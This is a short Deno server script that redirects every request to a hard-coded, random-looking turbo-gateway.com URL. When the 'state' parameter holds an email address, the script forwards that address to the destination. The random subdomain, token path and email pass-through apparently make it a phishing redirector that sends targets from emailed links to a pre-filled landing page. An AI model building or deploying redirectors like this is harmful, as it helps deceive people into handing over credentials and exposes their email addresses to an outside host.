const PORT = Number(Deno.env.get("PORT") || 8080);

const DESTINATION = "https://zru6ofa4zlb7di53nvvboqbraasu3nurc2ieob64cxfqcsvv3o5a.turbo-gateway.com/zGnnFBzKw_Gju21qF0AxACVNtpEWkEcH3BXLAUq127o";

Deno.serve({ port: PORT }, (req) => {
  const url = new URL(req.url);
  const state = url.searchParams.get("state");

  let target = DESTINATION;
  if (state && state.includes("@")) {
    const params = new URLSearchParams({ e: state });
    target += `?${params.toString()}`;
  }

  return Response.redirect(target, 302);
});
